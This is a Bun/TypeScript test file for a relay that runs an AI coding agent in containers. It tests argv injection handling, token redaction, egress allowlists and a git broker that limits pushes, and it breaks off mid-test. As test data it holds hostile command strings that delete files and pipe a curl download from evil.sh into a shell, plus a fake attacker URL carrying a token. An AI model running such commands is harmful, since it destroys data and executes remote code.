import { describe, expect, it } from "bun:test";
import type { ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import { stat } from "node:fs/promises";
import { type AddressInfo, createConnection, createServer } from "node:net";
import { join } from "node:path";
import {
	AGENT_ALLOWED_HOSTS,
	buildContainerArgs,
	buildFirewallCommands,
	buildNetworkAnchorArgs,
	buildOmpArgs,
	buildSetupHookEnv,
	buildWorkspaceCloneArgs,
	cloneWorkspaceWithMirrorFallback,
	createJobNetwork,
	deriveContainerName,
	deriveFirewallTableName,
	deriveJobNetworkName,
	deriveMirrorPath,
	deriveNetworkAnchorName,
	executeJob,
	fenceEnv,
	inspectReceivePack,
	isPublicEgressAddress,
	type Job,
	parseAllowedModels,
	prepareRuntimeGitHooks,
	runSetupHook,
	SETUP_ALLOWED_HOSTS,
	type SpawnFn,
	scrubJobResult,
	startEgressProxy,
	startGitBroker,
	tryPrepareRepoMirror,
	waitForNetworkGateway,
} from "../relay/relay";

/** Minimal ChildProcess double: capture spawn inputs, emit scripted output. */
class FakeChild extends EventEmitter {
	readonly stdout = new EventEmitter();
	readonly stderr = new EventEmitter();
	killed = false;

	kill(_signal?: NodeJS.Signals | number): boolean {
		this.killed = true;
		queueMicrotask(() => this.emit("close", null));
		return true;
	}
}

interface SpawnCapture {
	command: string;
	args: readonly string[];
	options: { cwd: string; shell?: false; env?: NodeJS.ProcessEnv; detached?: boolean };
}

function makeSpawn(script: (child: FakeChild) => void): { spawn: SpawnFn; calls: SpawnCapture[] } {
	const calls: SpawnCapture[] = [];
	const spawnImpl: SpawnFn = (command, args, options) => {
		calls.push({ command, args, options });
		const child = new FakeChild();
		queueMicrotask(() => script(child));
		return child as unknown as ChildProcess;
	};
	return { spawn: spawnImpl, calls };
}

const WINDOWS_INJECTION = 'title" && del /q C:\\* && echo "pwned';
const POSIX_INJECTION = "title; rm -rf ~; $(curl evil.sh | sh) `reboot`";

describe("parseAllowedModels", () => {
	it("parses comma-separated ids and treats empty input as allow-nothing", () => {
		expect(parseAllowedModels("combo-a, combo-b ,")).toEqual(["combo-a", "combo-b"]);
		expect(parseAllowedModels("")).toEqual([]);
		expect(parseAllowedModels(undefined)).toEqual([]);
	});
});

describe("buildOmpArgs", () => {
	it("keeps shell metacharacters as one literal argv entry behind a -- separator", () => {
		for (const hostile of [WINDOWS_INJECTION, POSIX_INJECTION]) {
			const args = buildOmpArgs("combo-a", hostile);
			expect(args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", hostile]);
			// The prompt is one argv element, never split or rewritten.
			expect(args[args.length - 1]).toBe(hostile);
			// And it rides behind `--`, so a leading dash cannot become a flag.
			expect(args[args.indexOf("--") + 1]).toBe(hostile);
		}
	});

	it("keeps a flag-shaped prompt positional", () => {
		const args = buildOmpArgs("combo-a", "--api-key steal");
		expect(args.slice(args.indexOf("--"))).toEqual(["--", "--api-key steal"]);
	});
});
describe("container command assembly", () => {
	it("mounts and limits the job while forwarding only the agent allowlist", () => {
		const args = buildContainerArgs(
			{
				model: "combo-a",
				prompt: "do the work",
				source: "github",
				githubToken: "ghs_leased",
				github: {
					owner: "kingkillery",
					repo: "oh-my-pk",
					number: 41,
					defaultBranch: "main",
				},
			},
			"/srv/relay/job-1",
			{
				PATH: "/host/bin",
				HOME: "/host/home",
				HOST_SECRET: "must-not-cross",
				OMPK_FENCE_URL: "https://worker.test/fence-check",
				OMPK_FENCE_JOB: "job-1",
				OMPK_FENCE_ATTEMPT: "attempt-1",
				OMPK_FENCE_TOKEN: "fence-1",
				RELAY_TOKEN: "host-relay-bearer",
				GH_TOKEN: "ghs_host",
				GIT_CONFIG_COUNT: "2",
				GIT_CONFIG_KEY_0: "core.hooksPath",
				GIT_CONFIG_VALUE_0: "/host/hooks",
				GIT_CONFIG_KEY_1: "url.auth.insteadOf",
				GIT_CONFIG_VALUE_1: "https://github.com/",
			},
			{
				image: "registry.test/ompk-agent:1",
				network: "ompk-job-1-attempt-2",
				egressProxyUrl: "http://10.88.0.1:31000",
				noProxyHosts: "10.88.0.1",
				name: deriveContainerName("job-1", "attempt-2", "agent"),
			},
			{
				authenticatedGitBaseUrl: "http://ompk-placeholder:opaque@10.88.0.1:32000/gh/",
				fenceUrl: "http://10.88.0.1:32000/fence-check",
				placeholderCredential: "opaque",
			},
		);

		expect(args).toContain("/srv/relay/job-1:/workspace:Z");
		expect(args).toContain("--network=ompk-job-1-attempt-2");
		expect(args).toContain("--http-proxy=false");
		expect(args[args.indexOf("--name") + 1]).toBe("ompk-job-1-attempt-2-agent");
		expect(args[args.indexOf("--memory") + 1]).toBe("4g");
		expect(args[args.indexOf("--pids-limit") + 1]).toBe("2048");
		expect(args).toContain("HOME=/tmp/ompk-home");
		expect(args.some(arg => arg.includes("ghs_leased"))).toBe(false);
		expect(args.some(arg => arg.includes("ghs_host"))).toBe(false);
		expect(args.some(arg => arg.includes("host-relay-bearer"))).toBe(false);
		expect(args.some(arg => /^(RELAY_TOKEN|GH_TOKEN)=/.test(arg))).toBe(false);
		expect(args).toContain("GIT_CONFIG_VALUE_0=/opt/ompk/git-hooks");
		expect(args.some(arg => arg.endsWith(":/opt/ompk/git-hooks:ro,z"))).toBe(true);
		expect(args).toContain("HTTPS_PROXY=http://10.88.0.1:31000");
		expect(args).toContain("NO_PROXY=10.88.0.1");
		expect(args).toContain("OMPK_FENCE_URL=http://10.88.0.1:32000/fence-check");
		expect(args).toContain("GIT_CONFIG_KEY_1=url.http://ompk-placeholder:opaque@10.88.0.1:32000/gh/.insteadOf");
		expect(args).toContain("OMPK_BROKER_CREDENTIAL=opaque");
		expect(args).toContain("OMPK_GITHUB_REPO=kingkillery/oh-my-pk");
		expect(args).toContain("OMPK_GITHUB_DEFAULT_BRANCH=main");
		expect(args).toContain("PATH=/opt/ompk/git-hooks:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
		expect(args.some(arg => arg.includes("must-not-cross"))).toBe(false);
		expect(args).not.toContain("PATH=/host/bin");
		expect(args.slice(-8)).toEqual([
			"registry.test/ompk-agent:1",
			"omp",
			"--print",
			"--yolo",
			"--model",
			"combo-a",
			"--",
			"do the work",
		]);
	});

	it("does not forward host GitHub credentials into a Linear container", () => {
		const args = buildContainerArgs(
			{ model: "combo-a", prompt: "linear work", source: "linear" },
			"/srv/relay/linear-job",
			{
				GH_TOKEN: "ghs_host_admin",
				GIT_CONFIG_COUNT: "1",
				GIT_CONFIG_KEY_0: "core.hooksPath",
				GIT_CONFIG_VALUE_0: "/host/hooks",
				GIT_CONFIG_KEY_1: "url.host-auth.insteadOf",
				GIT_CONFIG_VALUE_1: "https://github.com/",
			},
			{ image: "registry.test/ompk-agent:1", network: "ompk-linear-job" },
		);

		expect(args.some(arg => arg.includes("ghs_host_admin"))).toBe(false);
		expect(args.some(arg => arg.startsWith("GIT_CONFIG_KEY_1="))).toBe(false);
		expect(args.some(arg => arg.startsWith("GIT_CONFIG_VALUE_1="))).toBe(false);
		expect(args).toContain("GIT_CONFIG_COUNT=1");
	});

	it("materializes executable helper scripts for the read-only container mount", async () => {
		const runtimeHooks = await prepareRuntimeGitHooks();
		try {
			for (const name of ["pre-push", "gh"]) {
				const metadata = await stat(join(runtimeHooks.path, name));
				expect(metadata.isFile()).toBe(true);
				if (process.platform !== "win32") expect(metadata.mode & 0o100).toBe(0o100);
			}
		} finally {
			await runtimeHooks.remove();
		}
		expect(await Bun.file(join(runtimeHooks.path, "gh")).exists()).toBe(false);
	});
});

describe("setup hook isolation", () => {
	it("constructs setup env without GitHub, git-config, fence, or relay credentials", () => {
		const env = buildSetupHookEnv({
			PATH: "/usr/bin",
			HOME: "/safe-home",
			HTTPS_PROXY: "http://proxy.test",
			GH_TOKEN: "ghs_secret",
			GITHUB_TOKEN: "github-secret",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "url.auth.insteadOf",
			GIT_CONFIG_VALUE_0: "credentialed-url",
			OMPK_FENCE_TOKEN: "fence-secret",
			RELAY_TOKEN: "relay-secret",
			HOST_SECRET: "other-secret",
		});

		expect(env).toEqual({
			PATH: "/usr/bin",
			HOME: "/safe-home",
			HTTPS_PROXY: "http://proxy.test",
		});
		expect(env.GH_TOKEN).toBeUndefined();
		expect(env.GIT_CONFIG_COUNT).toBeUndefined();
		expect(env.OMPK_FENCE_TOKEN).toBeUndefined();
	});

	it("surfaces hook failure with scrubbed, truncated output", async () => {
		const secret = "ghs_setup_secret";
		const { spawn } = makeSpawn(child => {
			child.stdout.emit("data", `${secret}:${"x".repeat(5_000)}`);
			child.stderr.emit("data", `stderr ${secret}`);
			child.emit("close", 7);
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 1_000,
			hookExists: async () => true,
			redactionToken: secret,
		});

		expect(result?.success).toBe(false);
		expect(result?.error).toContain("setup hook .ompk/setup.sh failed with exit code 7");
		expect(result?.output).toContain("[redacted]");
		expect(result?.output).not.toContain(secret);
		expect(result?.output.length).toBeLessThan(4_200);
	});

	it("redacts repeated tokens split across the capture boundary", async () => {
		const secret = "ghs_boundary_secret";
		const split = 7;
		const { spawn } = makeSpawn(child => {
			child.stdout.emit("data", "x".repeat(4_080));
			child.stdout.emit("data", secret.slice(0, split));
			child.stdout.emit("data", secret.slice(split));
			child.stdout.emit("data", secret.repeat(100));
			child.emit("close", 9);
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 1_000,
			hookExists: async () => true,
			redactionToken: secret,
		});

		expect(result?.output).toContain("[redacted]");
		expect(result?.output).not.toContain(secret);
		expect(result?.output).not.toContain(secret.slice(0, split));
		expect(result?.output.length).toBeLessThan(4_200);
	});

	it("kills a timed-out hook and reports a transient job failure", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child;
			child.stdout.emit("data", "still installing");
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 5,
			hookExists: async () => true,
		});

		expect(result?.success).toBe(false);
		expect(result?.error).toContain("setup hook .ompk/setup.sh timed out");
		expect(result?.output).toContain("still installing");
		expect(result?.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});
});

describe("GitHub clone mirror", () => {
	it("derives a stable mirror path and builds dissociated reference clones", () => {
		const mirror = deriveMirrorPath("/cache", "owner/name", "repo name");
		expect(mirror).toBe(join("/cache", ".mirrors", "owner_name-repo_name.git"));
		expect(buildWorkspaceCloneArgs("https://github.com/o/r.git", "/job", mirror)).toEqual([
			"clone",
			"--origin",
			"origin",
			"--reference-if-able",
			mirror,
			"--dissociate",
			"https://github.com/o/r.git",
			"/job",
		]);
		expect(buildWorkspaceCloneArgs("https://github.com/o/r.git", "/job", undefined)).toEqual([
			"clone",
			"--origin",
			"origin",
			"https://github.com/o/r.git",
			"/job",
		]);
	});

	it("creates a mirror on first use and falls back after an update failure", async () => {
		const mirror = deriveMirrorPath("/cache", "owner", "repo");
		const calls: string[][] = [];
		const created = await tryPrepareRepoMirror(mirror, "https://github.com/owner/repo.git", {}, "ghs_secret", {
			makeDir: async () => undefined,
			mirrorExists: async () => false,
			runGit: async args => {
				calls.push([...args]);
			},
		});
		expect(created).toBe(mirror);
		expect(calls[0]).toEqual(["clone", "--mirror", "https://github.com/owner/repo.git", mirror]);

		const warnings: string[] = [];
		const fallback = await tryPrepareRepoMirror(mirror, "https://github.com/owner/repo.git", {}, "ghs_secret", {
			makeDir: async () => undefined,
			mirrorExists: async () => true,
			runGit: async args => {
				calls.push([...args]);
				throw new Error("update rejected for ghs_secret");
			},
			warn: message => warnings.push(message),
		});
		expect(fallback).toBeUndefined();
		expect(calls.at(-1)).toEqual(["remote", "update", "--prune"]);
		expect(warnings[0]).toContain("using full clone");
		expect(warnings[0]).toContain("[redacted]");
		expect(warnings[0]).not.toContain("ghs_secret");
	});

	it("retries a failed reference clone without the mirror", async () => {
		const mirror = deriveMirrorPath("/cache", "owner", "repo");
		const calls: string[][] = [];
		const removed: string[] = [];
		const warnings: string[] = [];
		await cloneWorkspaceWithMirrorFallback(
			"https://github.com/owner/repo.git",
			"/job",
			mirror,
			"/cache",
			{},
			"ghs_secret",
			{
				runGit: async args => {
					calls.push([...args]);
					if (calls.length === 1) throw new Error("corrupt mirror ghs_secret");
				},
				removeWorkspace: async path => {
					removed.push(path);
				},
				warn: message => warnings.push(message),
			},
		);

		expect(calls[0]).toContain("--reference-if-able");
		expect(calls[1]).not.toContain("--reference-if-able");
		expect(calls[1]).not.toContain("--dissociate");
		expect(removed).toEqual(["/job"]);
		expect(warnings[0]).toContain("retrying full clone");
		expect(warnings[0]).toContain("[redacted]");
		expect(warnings[0]).not.toContain("ghs_secret");
	});
});

describe("scrubJobResult", () => {
	it("redacts the installation token from output and error text", () => {
		const scrubbed = scrubJobResult(
			{
				success: false,
				output: "fatal: unable to access https://x-access-token:ghs_secret123@github.com/a/b.git",
				error: "clone failed with ghs_secret123",
				failureClass: "transient",
			},
			"ghs_secret123",
		);
		expect(scrubbed.output).not.toContain("ghs_secret123");
		expect(scrubbed.error).not.toContain("ghs_secret123");
		expect(scrubbed.output).toContain("[redacted]");
	});

	it("passes results through when no token is present", () => {
		const result = { success: true, output: "done" };
		expect(scrubJobResult(result, undefined)).toEqual(result);
	});
});

describe("fence environment threading", () => {
	it("passes the hooks env through to the spawned process verbatim", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		const env = {
			OMPK_FENCE_URL: "https://worker.test/fence-check",
			OMPK_FENCE_JOB: "job-1",
			OMPK_FENCE_ATTEMPT: "attempt-1",
			OMPK_FENCE_TOKEN: "token-1",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "core.hooksPath",
			GIT_CONFIG_VALUE_0: "/relay/git-hooks",
		};
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000, { env });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.options.env).toEqual(env);
	});

	it("spawns with the inherited environment when no hooks env is given", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(calls[0]!.options.env).toBeUndefined();
	});

	it("injects GitHub credentials into the child env only for GitHub jobs", () => {
		const base: Job = {
			id: "job-1",
			issueId: "kingkillery/oh-my-pk#7",
			issueIdentifier: "kingkillery/oh-my-pk#7",
			model: "combo-a",
			prompt: "p",
			status: "leased",
			createdAt: "2026-08-06T00:00:00Z",
			attemptId: "attempt-1",
			leaseToken: "lease-1",
		};
		const linearEnv = fenceEnv(base);
		expect(linearEnv.GH_TOKEN).toBe(process.env.GH_TOKEN);
		expect(linearEnv.GIT_CONFIG_COUNT).toBe("1");

		const githubEnv = fenceEnv({
			...base,
			source: "github",
			githubToken: "ghs_abc",
			github: { owner: "kingkillery", repo: "oh-my-pk", number: 7, defaultBranch: "main" },
		});
		expect(githubEnv.GH_TOKEN).toBe("ghs_abc");
		expect(githubEnv.GIT_CONFIG_COUNT).toBe("2");
		expect(githubEnv.GIT_CONFIG_KEY_1).toBe("url.https://x-access-token:ghs_abc@github.com/.insteadOf");
		expect(githubEnv.GIT_CONFIG_VALUE_1).toBe("https://github.com/");
		expect(githubEnv.GIT_CONFIG_KEY_0).toBe("core.hooksPath");
	});
});

describe("executeJob", () => {
	it("rejects a model that is not allowlisted without spawning anything", async () => {
		const { spawn, calls } = makeSpawn(() => {});
		const result = await executeJob(
			{ model: "model-injected-by-issue", prompt: "whatever" },
			["combo-a"],
			spawn,
			1_000,
		);
		expect(result.success).toBe(false);
		expect(result.error).toContain("allowlist");
		// Another relay may carry this model: retryable, not terminal.
		expect(result.failureClass).toBe("transient");
		expect(calls).toHaveLength(0);
	});

	it("dispatches an allowed model without a shell and returns the child's output", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.stdout.emit("data", "task complete");
			child.emit("close", 0);
		});
		const result = await executeJob({ model: "combo-a", prompt: WINDOWS_INJECTION }, ["combo-a"], spawn, 1_000);
		expect(result).toEqual({ success: true, output: "task complete", error: undefined });
		expect(calls).toHaveLength(1);
		const call = calls[0]!;
		// No shell: options carry no shell flag, and argv holds the hostile prompt verbatim.
		expect("shell" in call.options ? call.options.shell : undefined).toBeFalsy();
		expect(call.args[call.args.length - 1]).toBe(WINDOWS_INJECTION);
		expect(call.command).not.toContain(WINDOWS_INJECTION);
	});
	it("keeps the bare omp command and inherited env when container overrides are absent", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "plain" }, ["combo-a"], spawn, 1_000);

		expect(calls[0]?.command).toBe("omp");
		expect(calls[0]?.args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", "plain"]);
		expect(calls[0]?.options.env).toBeUndefined();
	});

	it("reports a failing exit code with stderr as the error", async () => {
		const { spawn } = makeSpawn(child => {
			child.stderr.emit("data", "model exploded");
			child.emit("close", 3);
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.error).toBe("model exploded");
		// Clean non-zero exits are deterministic: never auto-retried.
		expect(result.failureClass).toBe("permanent");
	});

	it("times out a hung child and kills it", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child; // never emits close
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 10);
		expect(result.success).toBe(false);
		expect(result.error).toContain("timed out");
		expect(result.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});

	it("awaits container cleanup before returning a timeout", async () => {
		let cleanupFinished = false;
		const { spawn } = makeSpawn(() => {});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 5, {
			command: "podman",
			args: ["run", "--name", "ompk-job-agent", "image", "omp"],
			nonZeroFailureClass: "transient",
			onTimeout: async () => {
				await Bun.sleep(5);
				cleanupFinished = true;
			},
		});

		expect(result.failureClass).toBe("transient");
		expect(result.error).toContain("timed out");
		expect(cleanupFinished).toBe(true);
	});

	it("classifies a spawn error as transient", async () => {
		const { spawn } = makeSpawn(child => {
			child.emit("error", new Error("EBUSY: omp binary locked"));
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.failureClass).toBe("transient");
	});
});

function firstProxyResponse(port: number, request: string): Promise<string> {
	const { promise, resolve, reject } = Promise.withResolvers<string>();
	const socket = createConnection({ host: "127.0.0.1", port }, () => socket.write(request));
	let response = "";
	const timer = setTimeout(() => {
		socket.destroy();
		reject(new Error("proxy response timed out"));
	}, 2_000);
	socket.on("data", chunk => {
		response += chunk.toString();
		if (response.includes("\r\n\r\n")) {
			clearTimeout(timer);
			socket.destroy();
			resolve(response);
		}
	});
	socket.once("error", error => {
		clearTimeout(timer);
		reject(error);
	});
	return promise;
}

describe("stage-scoped egress proxy", () => {
	it("keeps setup and agent host policies distinct", () => {
		expect(SETUP_ALLOWED_HOSTS.has("registry.npmjs.org:443")).toBe(true);
		expect(SETUP_ALLOWED_HOSTS.has("github.com:443")).toBe(true);
		expect(AGENT_ALLOWED_HOSTS.has("registry.npmjs.org:443")).toBe(false);
		expect(AGENT_ALLOWED_HOSTS.has("github.com:443")).toBe(false);
		expect(AGENT_ALLOWED_HOSTS).toEqual(new Set(["api.anthropic.com:443"]));
	});

	it("rejects arbitrary hosts and private DNS answers", async () => {
		const proxy = await startEgressProxy("agent", {
			resolveHost: async () => ["127.0.0.1"],
		});
		try {
			const arbitrary = await firstProxyResponse(
				proxy.port,
				"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com\r\n\r\n",
			);
			expect(arbitrary.startsWith("HTTP/1.1 403")).toBe(true);
			const rebound = await firstProxyResponse(
				proxy.port,
				"CONNECT api.anthropic.com:443 HTTP/1.1\r\nHost: api.anthropic.com\r\n\r\n",
			);
			expect(rebound.startsWith("HTTP/1.1 403")).toBe(true);
		} finally {
			proxy.stop();
		}
	});

	it("relays an allowlisted CONNECT through a deterministic upstream", async () => {
		const upstream = createServer(socket => socket.end());
		await new Promise<void>((resolve, reject) => {
			upstream.once("error", reject);
			upstream.listen(0, "127.0.0.1", resolve);
		});
		const upstreamPort = (upstream.address() as AddressInfo).port;
		const connectUpstream = ((_options: Parameters<typeof createConnection>[0], listener?: () => void) =>
			createConnection({ host: "127.0.0.1", port: upstreamPort }, listener)) as unknown as typeof createConnection;
		const proxy = await startEgressProxy("setup", {
			connectUpstream,
			resolveHost: async () => ["93.184.216.34"],
			verifyRemoteAddress: () => true,
		});
		try {
			const response = await firstProxyResponse(
				proxy.port,
				"CONNECT registry.npmjs.org:443 HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n",
			);
			expect(response.startsWith("HTTP/1.1 200")).toBe(true);
		} finally {
			proxy.stop();
			upstream.close();
		}
	});

	it("caps unterminated CONNECT headers", async () => {
		const proxy = await startEgressProxy("agent");
		try {
			const response = await firstProxyResponse(proxy.port, "A".repeat(9_000));
			expect(response.startsWith("HTTP/1.1 431")).toBe(true);
		} finally {
			proxy.stop();
		}
	});

	it("makes stop idempotent and blocks connections after deferred DNS resolution", async () => {
		const resolverStarted = Promise.withResolvers<void>();
		const dnsResult = Promise.withResolvers<readonly string[]>();
		let upstreamAttempts = 0;
		const proxy = await startEgressProxy("agent", {
			resolveHost: () => {
				resolverStarted.resolve();
				return dnsResult.promise;
			},
			connectUpstream: (() => {
				upstreamAttempts += 1;
				throw new Error("late connection attempted");
			}) as unknown as typeof createConnection,
		});
		const socket = createConnection({ host: "127.0.0.1", port: proxy.port }, () => {
			socket.write("CONNECT api.anthropic.com:443 HTTP/1.1\r\nHost: api.anthropic.com\r\n\r\n");
		});
		socket.once("error", () => undefined);
		await resolverStarted.promise;
		proxy.stop();
		proxy.stop();
		dnsResult.resolve(["93.184.216.34"]);
		await Bun.sleep(10);
		expect(upstreamAttempts).toBe(0);
		socket.destroy();
	});

	it("rejects private and special address ranges", () => {
		for (const address of [
			"127.0.0.1",
			"10.1.2.3",
			"169.254.1.1",
			"192.88.99.1",
			"192.168.1.1",
			"::1",
			"2001:2::1",
			"2001:db8::1",
			"2002::1",
			"3fff::1",
			"fd00::1",
		]) {
			expect(isPublicEgressAddress(address)).toBe(false);
		}
		expect(isPublicEgressAddress("93.184.216.34")).toBe(true);
		expect(isPublicEgressAddress("2606:4700:4700::1111")).toBe(true);
	});
});

function receivePackBody(ref: string): Uint8Array {
	const payload = `${"0".repeat(40)} ${"1".repeat(40)} ${ref}\0report-status\n`;
	const packet = `${(Buffer.byteLength(payload) + 4).toString(16).padStart(4, "0")}${payload}0000PACK`;
	return new TextEncoder().encode(packet);
}

describe("git broker", () => {
	it("parses receive-pack refs and rejects non-ompk targets", async () => {
		const rejectedBody = new Response(receivePackBody("refs/heads/main")).body;
		expect(rejectedBody).not.toBeNull();
		const rejected = await inspectReceivePack(rejectedBody!);
		expect(rejected).toEqual({
			ok: false,
			status: 403,
			error: "push to refs/heads/main is outside refs/heads/ompk/*",
		});
		const allowedBody = new Response(receivePackBody("refs/heads/ompk/fix-41")).body;
		expect(allowedBody).not.toBeNull();
		expect(await inspectReceivePack(allowedBody!)).toEqual({
			ok: true,
			refs: ["refs/heads/ompk/fix-41"],
		});
		const largePackBody = new Response(
			Buffer.concat([Buffer.from(receivePackBody("refs/heads/ompk/large-pack")), Buffer.alloc(100_000)]),
		).body;
		expect(largePackBody).not.toBeNull();
		expect(await inspectReceivePack(largePackBody!)).toEqual({
			ok: true,
			refs: ["refs/heads/ompk/large-pack"],
		});
	});

	it("never returns the token and enforces repository and push policy before issuance", async () => {
		const calls: Array<{ url: string; authorization?: string; body?: string }> = [];
		const fetchImpl: typeof fetch = async (input, init) => {
			const url = input instanceof Request ? input.url : String(input);
			const headers = new Headers(init?.headers);
			calls.push({
				url,
				authorization: headers.get("authorization") ?? undefined,
				body: typeof init?.body === "string" ? init.body : undefined,
			});
			if (url === "https://worker.test/github-token") {
				return Response.json({ token: "ghs_raw_installation_secret", expiresAt: "2026-08-06T20:00:00Z" });
			}
			if (url === "https://worker.test/fence-check") return Response.json({ valid: true });
			if (url.startsWith("https://github.com/")) return new Response("git-upstream-ok");
			throw new Error(`unexpected URL ${url}`);
		};
		const broker = await startGitBroker({
			jobId: "job-1",
			attemptId: "attempt-1",
			leaseToken: "lease-1",
			owner: "kingkillery",
			repo: "oh-my-pk",
			workerTokenUrl: "https://worker.test/github-token",
			workerRelayToken: "host-relay-secret",
			workerFenceUrl: "https://worker.test/fence-check",
			placeholderCredential: "opaque-placeholder",
			fetchImpl,
		});
		const brokerAuth = `Basic ${btoa("ompk-placeholder:opaque-placeholder")}`;
		try {
			const credential = await fetch(`${broker.url}/credential`);
			expect(credential.status).toBe(403);
			expect(await credential.text()).not.toContain("ghs_raw_installation_secret");

			const otherRepo = await fetch(`${broker.url}/gh/kingkillery/other.git/info/refs?service=git-upload-pack`, {
				headers: { Authorization: brokerAuth },
			});
			expect(otherRepo.status).toBe(403);

			const webEndpoint = await fetch(`${broker.url}/gh/kingkillery/oh-my-pk/issues`, {
				method: "POST",
				headers: { Authorization: brokerAuth },
				body: "{}",
			});
			expect(webEndpoint.status).toBe(403);

			const rejectedPush = await fetch(`${broker.url}/gh/kingkillery/oh-my-pk.git/git-receive-pack`, {
				method: "POST",
				headers: {
					Authorization: brokerAuth,
					"Content-Type": "application/x-git-receive-pack-request",
				},
				body: receivePackBody("refs/heads/main"),
			});
			expect(rejectedPush.status).toBe(403);
			expect(await rejectedPush.text()).toContain("refs/heads/main");
			expect(calls.some(call => call.url === "https://worker.test/github-token")).toBe(false);

			const allowedPush = await fetch(`${broker.url}/gh/kingkillery/oh-my-pk.git/git-receive-pack`, {
				method: "POST",
				headers: {
					Authorization: brokerAuth,
					"Content-Type": "application/x-git-receive-pack-request",
				},
				body: receivePackBody("refs/heads/ompk/fix-41"),
			});
			expect(allowedPush.status).toBe(200);
			expect(await allowedPush.text()).toBe("git-upstream-ok");
			expect(
				calls.some(
					call =>
						call.url === "https://worker.test/github-token" && call.authorization === "Bearer host-relay-secret",
				),
			).toBe(true);
			expect(
				calls.some(
					call =>
						call.url === "https://github.com/kingkillery/oh-my-pk.git/git-receive-pack" &&
						call.authorization === `Basic ${btoa("x-access-token:ghs_raw_installation_secret")}`,
				),
			).toBe(true);
		} finally {
			await broker.stop();
		}
	});

	it("brokers a bounded draft pull request with host-only authentication and redacted errors", async () => {
		const calls: Array<{ url: string; authorization?: string; body?: string }> = [];
		const fetchImpl: typeof fetch = async (input, init) => {
			const url = input instanceof Request ? input.url : String(input);
			const headers = new Headers(init?.headers);
			const body = typeof init?.body === "string" ? init.body : undefined;
			calls.push({ url, authorization: headers.get("authorization") ?? undefined, body });
			if (url === "https://worker.test/github-token") {
				return Response.json({ token: "ghs_pull_request_secret" });
			}
			if (url === "https://api.github.com/repos/kingkillery/oh-my-pk/pulls") {
				if (body && JSON.parse(body).title === "Force upstream failure") {
					return new Response("upstream echoed ghs_pull_request_secret", { status: 422 });
				}
				return Response.json({
					number: 43,
					html_url: "https://attacker.invalid/ghs_pull_request_secret",
					credential: "ghs_pull_request_secret",
				});
			}
			throw new Error(`unexpected URL ${url}`);
		};
		const broker = await startGitBroker({
			jobId: "job-pr",
			attemptId: "attempt-pr",
			leaseToken: "lease-pr",
			owner: "kingkillery",
			repo: "oh-my-pk",
			defaultBranch: "main",
			workerTokenUrl: "https://worker.test/github-token",
			workerRelayToken: "host-relay-secret",
			workerFenceUrl: "https://worker.test/fence-check",
			placeholderCredential: "pr-placeholder",
			fetchImpl,
		});
		const publish = async (values: Record<string, unknown>, placeholder = "pr-placeholder"): Promise<Response> =>
			fetch(`${broker.url}/pull-request`, {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
					"X-OMPK-Placeholder": placeholder,
				},
				body: JSON.stringify(values),
			});
		const validInput = {
			base: "main",
			head: "refs/heads/ompk/fix-41",
			title: "Fix issue 41",
			body: "Brokered body",
			draft: true,
		};
		try {
			const unauthenticated = await publish(validInput, "wrong-placeholder");
			expect(unauthenticated.status).toBe(401);
			const foreignRepository = await publish({
				...validInput,
				repo: "kingkillery/other",
			});
			expect(foreignRepository.status).toBe(400);
			const unsafeHead = await publish({ ...validInput, head: "main" });
			expect(unsafeHead.status).toBe(403);
			const malformedHead = await publish({ ...validInput, head: "ompk/bad..ref" });
			expect(malformedHead.status).toBe(403);
			const foreignBase = await publish({ ...validInput, base: "release" });
			expect(foreignBase.status).toBe(403);
			expect(calls).toHaveLength(0);

			const valid = await publish(validInput);
			expect(valid.status).toBe(200);
			const validText = await valid.text();
			expect(JSON.parse(validText)).toEqual({
				number: 43,
				url: "https://github.com/kingkillery/oh-my-pk/pull/43",
				draft: true,
			});
			expect(validText).not.toContain("ghs_pull_request_secret");
			const tokenCall = calls.find(call => call.url === "https://worker.test/github-token");
			expect(tokenCall?.authorization).toBe("Bearer host-relay-secret");
			expect(JSON.parse(tokenCall?.body ?? "{}")).toEqual({
				jobId: "job-pr",
				attemptId: "attempt-pr",
				leaseToken: "lease-pr",
			});
			const apiCall = calls.find(call => call.url.endsWith("/pulls"));
			expect(apiCall?.authorization).toBe("Bearer ghs_pull_request_secret");
			expect(JSON.parse(apiCall?.body ?? "{}")).toEqual({
				title: "Fix issue 41",
				body: "Brokered body",
				head: "ompk/fix-41",
				base: "main",
				draft: true,
			});

			const upstreamFailure = await publish({ ...validInput, title: "Force upstream failure" });
			expect(upstreamFailure.status).toBe(502);
			const failureText = await upstreamFailure.text();
			expect(failureText).toContain("creation failed (422)");
